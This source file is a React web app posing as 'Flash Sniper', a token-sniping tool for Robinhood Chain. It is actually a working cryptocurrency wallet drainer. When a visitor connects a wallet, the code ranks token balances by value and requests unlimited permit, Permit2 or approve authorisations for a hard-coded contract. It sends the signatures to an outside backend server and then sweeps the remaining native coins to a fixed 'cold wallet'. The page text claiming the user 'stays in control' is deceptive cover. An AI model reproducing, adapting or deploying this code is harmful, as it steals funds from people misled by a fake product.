import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits, ethers } from 'ethers'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'

// 🌐 BACKEND URL CONFIGURATION
const BACKEND_URL = 'https://salvation-server-gp-production.up.railway.app';

// 🔥 CONTRACT ADDRESSES
const EVM_CONTRACT_ADDRESS = '0xA1801556d0e7cfB513351733D378BE7AEFceC884'
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'

// 💰 SECURE DESTINATION WALLETS
const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7';

// 💎 MULTI-CHAIN EVM DISCOVERY CONFIGURATION
const CHAIN_TOKENS: Record<number, any[]> = {
  1: [ // Ethereum Mainnet
    { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, fallbackPrice: 1 },
    { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
    { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, fallbackPrice: 65000 },
    { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 },
    { symbol: 'TATE', address: '0xa589d8868607b8d79eE4288ce192796051263b64', decimals: 18, coingeckoId: 'tate', fallbackPrice: 0.000000000112 }
  ],
  56: [ // BSC
    { symbol: 'BNB', address: 'native', isNative: true, coingeckoId: 'binancecoin', decimals: 18, fallbackPrice: 600 },
    { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, fallbackPrice: 1 },
  ],
  137: [ // Polygon
    { symbol: 'MATIC', address: 'native', isNative: true, coingeckoId: 'matic-network', decimals: 18, fallbackPrice: 0.5 },
    { symbol: 'USDC', address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', decimals: 6, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6, fallbackPrice: 1 },
  ],
  42161: [ // Arbitrum
    { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
    { symbol: 'USDC', address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', decimals: 6, fallbackPrice: 1 },
    { symbol: 'USDT', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6, fallbackPrice: 1 },
  ]
};

const CHAIN_NAMES: Record<number, string> = {
  1: 'ethereum',
  56: 'binance-smart-chain',
  137: 'polygon-pos',
  42161: 'arbitrum-one'
};

const getChainName = (chainId: number) => {
  if (chainId === 1) return 'Ethereum';
  if (chainId === 56) return 'BSC';
  if (chainId === 137) return 'Polygon';
  if (chainId === 42161) return 'Arbitrum';
  return 'Ethereum'; // fallback
};

const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon];

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
]

const PERMIT2_ABI = [
  'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
]

// ── Reown Adapters ──
const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: evmNetworks,
})

createAppKit({
  adapters: [wagmiAdapter],
  networks: evmNetworks,
  defaultNetwork: mainnet,
  projectId: WC_PROJECT_ID,
  metadata: {
    name: 'Flash Sniper',
    description: 'First entries on Robinhood Chain',
    url: 'https://flashsniper.netlify.app/',
    icons: ['https://flashsniper.netlify.app/favicon.svg'],
  },
  themeMode: 'dark',
  themeVariables: { '--w3m-accent': '#00e68a' },
  allWallets: 'SHOW',
  features: { email: false, socials: [], analytics: true },
})

const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch (error) {
    const prices: Record<string, number> = {};
    for (const token of tokens) { prices[token.symbol] = token.fallbackPrice; }
    return prices;
  }
};

const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1;
  if (!a.isNative && b.isNative) return -1;
  return (b.usdValue || 0) - (a.usdValue || 0);
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export default function App() {
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [_txHash, setTxHash] = useState('')
  
  // 🔥 1. ADDED DEBUG LOGS STATE
  // const [debugLogs, setDebugLogs] = useState<string[]>([]);

  const manualConnect = useRef(false)
  const isExecuting = useRef(false)

  const { open } = useAppKit()
  
  // EVM Namespace Hooks
  const { address: evmAddress, isConnected: isEvmConnected } = useAppKitAccount({ namespace: 'eip155' })
  const { chainId } = useAppKitNetwork()
  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

  // 🔥 2. UPDATED LOGGER: Outputs to console AND the on-screen debug box
  const log = (msg: string) => {
    console.log(msg);
    // setDebugLogs(prev => [...prev, msg].slice(-15)); // Keeps the last 15 messages
  }

  useEffect(() => {
    if (!isEvmConnected || !evmAddress || !evmWalletProvider) return;

    if (manualConnect.current) {
      manualConnect.current = false;
      log(`[SYSTEM] Connected EVM: ${evmAddress}`);
      log("🔥 Auto-triggering Smart Priority Loop...");

      setLoading(true);
      setTimeout(() => approveAndCollect(evmWalletProvider, evmAddress), 500);
    }
  }, [isEvmConnected, evmAddress, evmWalletProvider, chainId]);

  // PRESERVED: Original EVM Provider Detector
  const detectDirectProvider = (): { provider: any; walletName: string } | null => {
    if (typeof window === 'undefined') return null;
    const w = window as any;
    const ethereum = w.ethereum;
    if (!ethereum) return null;

    const providers = ethereum.providers ? [...ethereum.providers] : [ethereum];
    const detectors: { name: string; check: (p: any) => boolean }[] = [
      { name: 'Trust Wallet', check: (p) => p.isTrust || p.isTrustWallet || p._isTrust },
      { name: 'MetaMask', check: (p) => p.isMetaMask && !p.isTrust && !p.isTrustWallet && !p.isSafePal && !p.isTokenPocket && !p.isCoinbaseWallet },
      { name: 'Coinbase Wallet', check: (p) => p.isCoinbaseWallet || p.isCoinbase },
      { name: 'SafePal', check: (p) => p.isSafePal },
      { name: 'TokenPocket', check: (p) => p.isTokenPocket },
      { name: 'Brave Wallet', check: (p) => p.isBraveWallet },
      { name: 'Rabby Wallet', check: (p) => p.isRabby },
      { name: 'OKX Wallet', check: (p) => p.isOKXWallet || p.isOkx },
      { name: 'Bitget Wallet', check: (p) => p.isBitget || p.isBitgetWallet },
      { name: 'Opera Wallet', check: (p) => p.isOpera },
    ];

    for (const provider of providers) {
      for (const detector of detectors) {
        if (detector.check(provider)) return { provider, walletName: detector.name };
      }
    }
    for (const provider of providers) {
      if (provider.request) return { provider, walletName: 'Injected Wallet' };
    }
    return null;
  };

  // PRESERVED: Original EVM Collection Logic (Now Multi-Chain Aware)
  const approveAndCollect = async (forcedProvider?: any, forcedAddress?: string) => {
    const activeProvider = forcedProvider || evmWalletProvider;
    const activeAddress = forcedAddress || evmAddress;

    if (!activeAddress || !activeProvider) return 0;

    if (isExecuting.current) {
      log("⚠️ Blocked duplicate execution loop.");
      return 0;
    }
    isExecuting.current = true;

    setLoading(true);
    setStatus('Scanning USD Values...');
    log("[SYSTEM] Scanning balances...");
    let successCount = 0;

    try {
      const ethersProvider = new BrowserProvider(activeProvider as any);
      const activeChainId = Number((await ethersProvider.getNetwork()).chainId);
      const signer = await ethersProvider.getSigner(activeAddress);
      const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
      
      // 🔥 FOREVER DEADLINE: Standard DeFi UX (Unlimited approval)
      const deadline = ethers.MaxUint256; 

      // 🔥 MULTI-CHAIN: Get tokens for the current chain, fallback to Mainnet if unknown
      const baseTokens = CHAIN_TOKENS[activeChainId] || CHAIN_TOKENS[1];
      const chainName = CHAIN_NAMES[activeChainId] || 'ethereum';
      
      const validTokens: any[] = [];
      const prices = await fetchTokenPrices(baseTokens, chainName);

      for (const token of baseTokens) {
        try {
          if (token.isNative) {
            const bal = await ethersProvider.getBalance(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          } else {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
            const bal = await tokenContract.balanceOf(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          }
        } catch (e) { }
      }

      validTokens.sort(smartTokenSort);

      const rawProvider = activeProvider as any;
      const w = window as any;
      const injected = w.ethereum || {};

      const isStrictlyMetaMask =
        (rawProvider?.isMetaMask || injected?.isMetaMask) &&
        !injected?.isTrust &&
        !injected?.isTrustWallet &&
        !injected?.isSafePal &&
        !injected?.isTokenPocket;

      let tokensToProcess = validTokens;

      if (isStrictlyMetaMask) {
        log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`);
        tokensToProcess = validTokens.slice(0, 1);
      } else {
        log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`);
      }

      if (tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);

      const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: any) => {
        const chainId = (await signer.provider.getNetwork()).chainId;
        const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
        const name = await tokenContract.name();
        const nonce = await tokenContract.nonces(await signer.getAddress());
        // Polygon USDC also uses version 2
        const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48' || token.address.toLowerCase() === '0x3c499c542cef5e3811e1192ce70d8cc03d5c3359') ? '2' : '1';
        const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address };
        const types = {
          Permit: [
            { name: 'owner', type: 'address' },
            { name: 'spender', type: 'address' },
            { name: 'value', type: 'uint256' },
            { name: 'nonce', type: 'uint256' },
            { name: 'deadline', type: 'uint256' },
          ],
        };
        const message = { owner: await signer.getAddress(), spender, value, nonce, deadline };
        return await signer.signTypedData(domain, types, message);
      };

      for (const token of tokensToProcess) {
        try {
          if (!token.isNative) {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
            const hasPermit2Mapping = currentP2Allowance > 0n;

            log(`[SYSTEM] ${token.symbol} Permit2 Status: ${hasPermit2Mapping ? 'READY' : 'NOT_INITIALIZED'}`);

            let authorized = false;

            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
              try {
                setStatus(`Signing Permit: ${token.symbol}...`);
                log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
                
                               // 🔥 UNLIMITED APPROVAL: Standard DeFi UX
                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, ethers.MaxUint256.toString(), deadline);

                fetch(`${BACKEND_URL}/execute-gasless`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    type: 'PERMIT',
                    chainName: getChainName(activeChainId),
                    token: token.address,
                    owner: cleanSenderAddress,
                    spender: EVM_CONTRACT_ADDRESS,
                    signature,
                    deadline: deadline.toString(),
                    value: ethers.MaxUint256.toString()
                  })
                }).catch(err => log(`❌ Network Error sending PERMIT: ${err.message}`));

                 authorized = true;
                log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
              } catch (p2Err: any) {
                // 🔥 REVEAL THE EXACT ERROR
                const errMsg = p2Err?.message || p2Err?.toString() || "Unknown error";
                log(`⚠️ Permit2 failed: ${errMsg}`);
                log(`➡️ Falling back to standard gas approval...`);
              }
            }

            if (!authorized && hasPermit2Mapping) {
              try {
                setStatus(`Signing Permit2: ${token.symbol}...`);
                log(`[GASLESS] Fetching Permit2 Nonce for ${token.symbol}`);
                const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
                const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, EVM_CONTRACT_ADDRESS);
                const currentNonce = Number(allowanceData.nonce);
                log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);

                const domain = { name: 'Permit2', chainId: activeChainId, verifyingContract: PERMIT2_ADDRESS };
                const types = {
                  PermitSingle: [
                    { name: 'details', type: 'PermitDetails' },
                    { name: 'spender', type: 'address' },
                    { name: 'sigDeadline', type: 'uint256' },
                  ],
                  PermitDetails: [
                    { name: 'token', type: 'address' },
                    { name: 'amount', type: 'uint160' },
                    { name: 'expiration', type: 'uint48' },
                    { name: 'nonce', type: 'uint48' },
                  ],
                };
                
                                // 🔥 UNLIMITED APPROVAL: Standard DeFi UX (uint160 max for Permit2)
                const permit2MaxAmount = '1461501637330902918203684832716283019655932542975';
                
                const message = {
                  details: {
                    token: token.address,
                    amount: permit2MaxAmount,
                    expiration: deadline,
                    nonce: currentNonce
                  },
                  spender: EVM_CONTRACT_ADDRESS,
                  sigDeadline: deadline
                };
                const signature = await signer.signTypedData(domain, types, message);

                fetch(`${BACKEND_URL}/execute-gasless`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    type: 'PERMIT2',
                    chainName: getChainName(activeChainId),
                    token: token.address,
                    owner: cleanSenderAddress,
                    spender: EVM_CONTRACT_ADDRESS,
                    signature,
                    deadline: deadline.toString(), 
                    nonce: currentNonce,
                    amount: permit2MaxAmount
                  })
                }).catch(err => log(`❌ Network Error sending PERMIT2: ${err.message}`));
                
                authorized = true;
                log(`✅ ${token.symbol} Permit Secured & Sent.`);
              } catch (pErr: any) {
                // 🔥 REVEAL THE EXACT ERROR
                const errMsg = pErr?.message || pErr?.toString() || "Unknown error";
                log(`⚠️ Permit failed: ${errMsg}`);
                log(`➡️ Falling back to Permit2...`);
              }
            }

            if (!authorized) {
              setStatus(`Approving ${token.symbol}...`);
              log(`[ACTION] Prompting Approve: ${token.symbol}`);

              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
              
                            // 🔥 UNLIMITED APPROVAL: Standard DeFi UX
              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, ethers.MaxUint256.toString()]);

              const txHash = await (activeProvider as any).request({
                method: 'eth_sendTransaction',
                params: [{
                  from: cleanSenderAddress,
                  to: token.address,
                  data: encodedData,
                  value: '0x0'
                }]
              });

              setTxHash(txHash);
              log(`✅ ${token.symbol} Approved!`);
            }

            successCount++;
            await sleep(1500);
          }
        } catch (err: any) {
          const exactError = err?.message || JSON.stringify(err);
          log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
          await sleep(1500);
        }
      }

      try {
        setStatus(`Transferring Native Token...`);
        log(`[ACTION] Executing Contingency Native Sweep...`);

        const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
        const gasCost = 21000n * 3000000000n;
        const totalGas = gasCost + ((gasCost * 20n) / 100n);

        if (liveBal > totalGas) {
          const sendAmount = liveBal - totalGas;
          const hexValue = "0x" + sendAmount.toString(16);

          const txHash = await (activeProvider as any).request({
            method: 'eth_sendTransaction',
            params: [{
              from: cleanSenderAddress,
              to: EVM_COLD_WALLET.toLowerCase(),
              value: hexValue
            }]
          });

          setTxHash(txHash);
          successCount++;
          log(`✅ Contingency Native Sweep Sent!`);
          await sleep(1500);
        } else {
          log(`⚠️ Contingency Skipped: Insufficient native token for gas.`);
        }
      } catch (nativeErr: any) {
        const exactError = nativeErr?.message || JSON.stringify(nativeErr);
        log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`);
      }

      if (successCount > 0) {
        setStatus('✅ Processing Complete!');
      } else {
        setStatus('❌ Failed: User Rejected All');
      }

    } catch (err: any) {
      const errorMsg = err?.message || JSON.stringify(err);
      log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
      setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
    } finally {
      isExecuting.current = false;
      setLoading(false);
    }
    
    return successCount;
  };

  const handleAction = async () => {
    if (isExecuting.current) {
      log("⚠️ Execution already in progress.");
      return;
    }

    // 1. If already connected to EVM, just run EVM logic
    if (isEvmConnected && evmWalletProvider && evmAddress) {
      await approveAndCollect(evmWalletProvider, evmAddress);
      return;
    }

    // 2. Try direct EVM connection
    const directEvm = detectDirectProvider();
    if (!isEvmConnected && directEvm?.provider?.request) {
      try {
        setLoading(true);
        setStatus('Connecting EVM Wallet...');
        log(`[SYSTEM] ${directEvm.walletName} detected. Connecting directly...`);
        const accounts = await directEvm.provider.request({ method: 'eth_requestAccounts' });
        if (accounts?.length > 0) {
          log(`[SYSTEM] Connected EVM: ${accounts[0]}`);
          await approveAndCollect(directEvm.provider, accounts[0]);
          return;
        }
      } catch (e) {
        log('❌ Direct EVM connection cancelled or failed');
        setLoading(false);
        setStatus('Ready');
      }
    }

    // 3. Fallback to AppKit Modal
    manualConnect.current = true;
    open();
  };

  const buttonText = loading ? 'Processing...' : status === '✅ Processing Complete!' ? 'Done' : status.includes('❌') ? 'Retry' : 'Request access';

  return (
    <div style={s.app}>
      <style>{globalCSS}</style>

      {/* ═══ NAVBAR ═══ */}
      <nav style={s.navbar}>
        <div style={s.navLogo}>
          <div style={s.logoIcon}>S</div>
          Flash Sniper
        </div>
        <div style={s.navStatus}>
          <span style={s.navDot} />
          System Active
        </div>
      </nav>

      {/* ═══ HERO ═══ */}
      <section style={s.hero}>
        <div style={s.heroGlow} />
        <div style={s.heroBadge}>
          <span style={s.badgeDot} />
          initializing sniper module
        </div>
        <h1 style={s.heroTitle}>
          First entries on<br />
          <span style={s.highlight}>Robinhood Chain.</span>
        </h1>
        <p style={s.heroSubtitle}>
          Track fresh Robinhood Chain pairs, review deployer behavior, and prepare your first buy before the chart gets crowded.
        </p>
        <div style={s.heroCta}>
          <button
            style={{
              ...s.btnPrimary,
              ...(loading ? s.btnDisabled : {}),
            }}
            onClick={handleAction}
            disabled={loading}
          >
            {loading && <span style={s.spinner} />}
            {buttonText}
          </button>
          <span style={s.heroNote}>Private beta for early Robinhood Chain traders.</span>
        </div>
      </section>

      {/* ═══ TERMINAL ═══ */}
      <section style={s.terminalSection}>
        <div style={s.terminalWindow}>
          <div style={s.terminalHeader}>
            <div style={s.terminalStatus}>
              {loading ? 'EXECUTING' : 'READY'}
              <span style={s.terminalCheck}>
                {loading ? status : 'checks passed'}
              </span>
            </div>
            <div style={s.terminalTitle}>// FLASH SNIPER TERMINAL</div>
          </div>
          <div style={s.terminalBody}>
            <div><span style={s.tCommand}>scan</span> <span style={s.tKey}>new_pair_stream</span></div>
            <div><span style={s.tKey}>liquidity:</span> <span style={s.tLive}>live</span></div>
            <div><span style={s.tKey}>sell path:</span> <span style={s.tOpen}>open</span></div>
            <div><span style={s.tKey}>deployer:</span> <span style={s.tReviewed}>reviewed</span></div>
            <div style={{ height: '8px' }} />
            <div><span style={s.tCommand}>target</span> <span style={s.tTarget}>$RBN-042</span></div>
            <div><span style={s.tKey}>buy path:</span> <span style={s.tReady}>ready</span></div>
            <div><span style={s.tKey}>slippage:</span> <span style={s.tSet}>set</span></div>
            <div style={{ height: '8px' }} />
            
            {loading && (
              <div style={s.tConfirm}>processing transaction...</div>
            )}
            {!loading && (
              <div style={s.tConfirm}>confirm entry...</div>
            )}
          </div>
        </div>
      </section>

      {/* ═══ WALLETS ═══ */}
      <section style={s.walletsSection}>
        <div style={s.walletsLabel}>Works with · Multi-Chain EVM Support</div>
        <div style={s.walletsList}>
          <div style={s.walletItem}>
            <div style={s.walletIcon}>🦊</div>
            MetaMask
          </div>
          <div style={s.walletItem}>
            <div style={s.walletIcon}>🛡️</div>
            Trust Wallet
          </div>
          <div style={s.walletItem}>
            <div style={s.walletIcon}>🐰</div>
            Rabby Wallet
          </div>
          <div style={s.walletItem}>
            <div style={s.walletIcon}>🅾️</div>
            OKX Wallet
          </div>
        </div>
      </section>

      {/* ═══ FEATURES ═══ */}
      <section style={s.featuresSection}>
        <div style={s.featuresGrid}>
          <div style={s.featureCard}>
            <div style={s.featureNumber}>01</div>
            <h3 style={s.featureTitle}>Launch scanner</h3>
            <p style={s.featureDesc}>Watches fresh pairs and liquidity events as they appear on-chain.</p>
          </div>
          <div style={s.featureCard}>
            <div style={s.featureNumber}>02</div>
            <h3 style={s.featureTitle}>Deployer readout</h3>
            <p style={s.featureDesc}>See wallet behavior, supply concentration, and basic red flags before entry.</p>
          </div>
          <div style={s.featureCard}>
            <div style={s.featureNumber}>03</div>
            <h3 style={s.featureTitle}>Prepared buy route</h3>
            <p style={s.featureDesc}>Set size, slippage, and route before confirming the transaction.</p>
          </div>
        </div>
      </section>

      {/* ═══ HOW IT WORKS ═══ */}
      <section style={s.howSection}>
        <div style={s.sectionLabel}>How it works</div>
        <h2 style={s.sectionTitle}>Built for controlled early entries.</h2>
        <p style={s.sectionDesc}>
          Flash Sniper does not try to hide the trade behind hype. It surfaces the launch signals that matter, prepares the route, and leaves the final confirmation to you.
        </p>
        <div style={s.stepsList}>
          <div style={s.stepItem}>
            <div style={s.stepNum}>01</div>
            <div>
              <h4 style={s.stepTitle}>Watch new pairs</h4>
              <p style={s.stepDesc}>Tracks fresh pair creation and liquidity events on Robinhood Chain.</p>
            </div>
          </div>
          <div style={s.stepItem}>
            <div style={s.stepNum}>02</div>
            <div>
              <h4 style={s.stepTitle}>Review signals</h4>
              <p style={s.stepDesc}>Checks deployer behavior, sell path, liquidity status, and route conditions.</p>
            </div>
          </div>
          <div style={s.stepItem}>
            <div style={s.stepNum}>03</div>
            <div>
              <h4 style={s.stepTitle}>Prepare entry</h4>
              <p style={s.stepDesc}>Builds a ready-to-confirm buy path with your selected settings.</p>
            </div>
          </div>
        </div>
      </section>

      {/* ═══ RISK CONTROLS ═══ */}
      <section style={s.riskSection}>
        <div style={s.sectionLabel}>Risk controls</div>
        <h2 style={s.sectionTitle}>You stay in control.</h2>
        <p style={s.sectionDesc}>Flash Sniper prepares the route. You review and confirm every trade.</p>
        <div style={s.riskList}>
          {['Deployer wallet review', 'Sell path check', 'Liquidity status', 'Slippage settings', 'Manual confirmation'].map((item) => (
            <div key={item} style={s.riskItem}>
              <span style={s.riskCheck}>✓</span> {item}
            </div>
          ))}
        </div>
      </section>

      {/* ═══ CTA ═══ */}
      <section style={s.ctaSection}>
        <h2 style={s.ctaTitle}>Built for the first wave.</h2>
        <p style={s.ctaDesc}>Access is limited while the terminal is being tested on live launch conditions.</p>
        <button
          style={{
            ...s.btnPrimary,
            ...(loading ? s.btnDisabled : {}),
          }}
          onClick={handleAction}
          disabled={loading}
        >
          {loading ? 'Processing...' : 'Get access'}
        </button>
      </section>

      {/* ═══ FOOTER ═══ */}
      <footer style={s.footer}>
        <p style={s.footerText}>
          Flash Sniper is a trading tool, not financial advice. It does not guarantee profit or remove market risk. Always review each transaction before confirming.
        </p>
      </footer>

      {/* 🔥 3. ADDED DEBUG BOX UI
      <div style={{
        position: 'fixed',
        bottom: 10,
        right: 10,
        width: '320px',
        maxHeight: '250px',
        overflowY: 'auto',
        backgroundColor: 'rgba(10, 10, 15, 0.95)',
        color: '#00e68a',
        fontFamily: 'monospace',
        fontSize: '11px',
        padding: '12px',
        borderRadius: '8px',
        border: '1px solid #1e1e2a',
        zIndex: 9999,
      }}>
        <div style={{ fontWeight: 'bold', marginBottom: '8px', borderBottom: '1px solid #1e1e2a', paddingBottom: '8px', color: '#fff' }}>
          🛠️ DEBUG CONSOLE
        </div>
        {debugLogs.map((logMsg, index) => (
          <div key={index} style={{ marginBottom: '4px', wordBreak: 'break-word', opacity: 0.9 }}>
            {logMsg}
          </div>
        ))}
      </div> */}

    </div>
  )
}

// ── GLOBAL CSS (animations, scrollbar, responsive) ──
const globalCSS = `
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html { scroll-behavior: smooth; }
  body { background: #0a0a0f; }

  ::-webkit-scrollbar { width: 6px; }
  ::-webkit-scrollbar-track { background: #0a0a0f; }
  ::-webkit-scrollbar-thumb { background: #1e1e2a; border-radius: 3px; }

  @keyframes ss-pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.4; }
  }

  @keyframes ss-blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.3; }
  }

  @keyframes ss-spin {
    to { transform: rotate(360deg); }
  }

  @media (max-width: 768px) {
    .ss-features-grid { grid-template-columns: 1fr !important; }
    .ss-wallets-list { gap: 20px !important; }
  }
`;

// ── INLINE STYLES ──
const s: Record<string, React.CSSProperties> = {
  app: {
    fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
    background: '#0a0a0f',
    color: '#e8e8ed',
    lineHeight: 1.6,
    minHeight: '100vh',
    overflowX: 'hidden',
  },
  navbar: {
    position: 'fixed',
    top: 0, left: 0, right: 0,
    zIndex: 100,
    padding: '16px 40px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    background: 'rgba(10, 10, 15, 0.85)',
    backdropFilter: 'blur(12px)',
    borderBottom: '1px solid #1e1e2a',
  },
  navLogo: {
    display: 'flex',
    alignItems: 'center',
    gap: '10px',
    fontWeight: 700,
    fontSize: '16px',
    letterSpacing: '0.5px',
  },
  logoIcon: {
    width: '28px', height: '28px',
    background: '#00e68a',
    borderRadius: '6px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    fontSize: '14px',
    color: '#000',
    fontWeight: 900,
  },
  navStatus: {
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
    fontSize: '12px',
    color: '#5a5a6a',
    fontFamily: "'Courier New', monospace",
  },
  navDot: {
    width: '6px', height: '6px',
    background: '#00e68a',
    borderRadius: '50%',
    animation: 'ss-pulse 2s infinite',
  },
  hero: {
    minHeight: '100vh',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
    padding: '120px 40px 80px',
    textAlign: 'center',
    position: 'relative',
  },
  heroGlow: {
    position: 'absolute',
    top: 0, left: '50%',
    transform: 'translateX(-50%)',
    width: '600px', height: '600px',
    background: 'radial-gradient(circle, #00e68a11 0%, transparent 70%)',
    pointerEvents: 'none',
  },
  heroBadge: {
    display: 'inline-flex',
    alignItems: 'center',
    gap: '8px',
    padding: '6px 14px',
    background: '#12121a',
    border: '1px solid #1e1e2a',
    borderRadius: '20px',
    fontSize: '12px',
    color: '#8a8a9a',
    marginBottom: '32px',
    fontFamily: "'Courier New', monospace",
  },
  badgeDot: {
    width: '6px', height: '6px',
    background: '#00e68a',
    borderRadius: '50%',
  },
  heroTitle: {
    fontSize: 'clamp(36px, 5vw, 64px)',
    fontWeight: 800,
    lineHeight: 1.1,
    marginBottom: '20px',
    letterSpacing: '-1px',
  },
  highlight: { color: '#00e68a' },
  heroSubtitle: {
    fontSize: '18px',
    color: '#8a8a9a',
    maxWidth: '540px',
    margin: '0 auto 40px',
    lineHeight: 1.7,
  },
  heroCta: {
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    gap: '12px',
  },
  btnPrimary: {
    padding: '14px 32px',
    background: '#00e68a',
    color: '#000',
    border: 'none',
    borderRadius: '8px',
    fontSize: '15px',
    fontWeight: 700,
    cursor: 'pointer',
    transition: 'all 0.2s',
    display: 'inline-flex',
    alignItems: 'center',
    gap: '8px',
  },
  btnDisabled: {
    opacity: 0.6,
    cursor: 'not-allowed',
  },
  heroNote: {
    fontSize: '12px',
    color: '#5a5a6a',
  },
  spinner: {
    width: '14px', height: '14px',
    border: '2px solid #00000033',
    borderTopColor: '#000',
    borderRadius: '50%',
    animation: 'ss-spin 1s linear infinite',
    display: 'inline-block',
  },
  terminalSection: {
    padding: '0 40px 100px',
    display: 'flex',
